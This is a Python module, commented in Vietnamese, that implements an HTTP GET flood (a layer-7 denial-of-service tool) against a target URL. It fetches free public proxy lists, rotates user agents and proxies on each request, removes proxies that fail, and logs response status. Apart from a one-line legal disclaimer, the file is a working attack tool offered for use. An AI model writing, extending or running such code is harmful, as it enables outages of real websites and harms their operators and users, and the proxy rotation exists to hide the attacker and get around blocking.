"""Module cung cấp hàm flood để thực hiện HTTP GET request DoS attack thông qua proxy.

Lưu ý: Việc tấn công DoS có thể vi phạm pháp luật. Chỉ sử dụng cho mục đích nghiên cứu và kiểm thử trong môi trường hợp pháp.
"""

import json
import random
import sys
import warnings
import logging
from typing import Dict, List

import requests
from requests.exceptions import ConnectionError, Timeout, ProxyError
from urllib3.exceptions import ProxySchemeUnknown

from colorama import Fore as F

# Tắt cảnh báo cho các request HTTPS không xác thực
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

# Cấu hình logging để theo dõi quá trình chạy
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def load_user_agents(file_path: str = "tools/L7/user_agents.json") -> List[str]:
    """Load danh sách user-agents từ file JSON."""
    try:
        with open(file_path, "r") as agents:
            data = json.load(agents)
            return data.get("agents", [])
    except Exception as e:
        logging.error("Lỗi khi load user agents: %s", e)
        return []

user_agents = load_user_agents()

def get_http_proxies() -> List[Dict[str, str]]:
    """Lấy danh sách proxies sử dụng giao thức HTTP.

    Returns:
        List[Dict[str, str]]: Danh sách các proxy với schema cho http và https.
    """
    try:
        response = requests.get(
            "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=20000",
            verify=False,
            timeout=10
        )
        response.raise_for_status()
        # Đảm bảo mỗi proxy đều có schema cho cả HTTP và HTTPS
        proxies = [
            {"http": f"http://{proxy.strip()}", "https": f"http://{proxy.strip()}"}
            for proxy in response.text.splitlines() if proxy.strip()
        ]
        return proxies
    except (Timeout, ConnectionError) as e:
        logging.error("Không thể kết nối đến nguồn proxy: %s", e)
        sys.exit(1)
    except Exception as e:
        logging.error("Lỗi khi lấy proxy: %s", e)
        sys.exit(1)

proxies = get_http_proxies()

# Default headers cho request
headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
}

# Màu sắc hiển thị trạng thái (200 -> green, khác -> red)
color_code = {True: F.GREEN, False: F.RED}

def flood(target: str) -> None:
    """Thực hiện HTTP GET request flood thông qua proxy.

    Args:
        target (str): URL mục tiêu flood.
    """
    global proxies, headers

    # Chọn ngẫu nhiên một user-agent cho mỗi request
    headers["User-agent"] = random.choice(user_agents) if user_agents else "Mozilla/5.0"

    try:
        # Chọn một proxy ngẫu nhiên từ danh sách
        proxy = random.choice(proxies)
    except IndexError:
        logging.error("Danh sách proxy trống. Tải lại danh sách proxy.")
        proxies.extend(get_http_proxies())
        proxy = random.choice(proxies)

    try:
        response = requests.get(target, headers=headers, proxies=proxy, timeout=4, verify=False)
    except (Timeout, OSError, ProxyError, ProxySchemeUnknown) as e:
        logging.warning("Proxy không hợp lệ (%s). Xóa khỏi danh sách. Chi tiết: %s", proxy, e)
        try:
            proxies.remove(proxy)
        except ValueError:
            proxies.extend(get_http_proxies())
        return
    except Exception as e:
        logging.error("Lỗi khi gửi request: %s", e)
        return

    # In thông tin trạng thái của request
    status = f"{color_code[response.status_code == 200]}Status: [{response.status_code}]"
    payload_size = f"Requested Data Size: {F.CYAN}{round(len(response.content) / 1024, 2):>6} KB{F.RESET}"
    proxy_addr = f"Proxy: {F.CYAN}{proxy['http']:>21}{F.RESET}"
    logging.info("%s --> %s | %s", status, payload_size, proxy_addr)

    # Nếu có lỗi trong response, reload proxy
    if not response.status_code:
        try:
            proxies.remove(proxy)
        except ValueError:
            proxies.extend(get_http_proxies())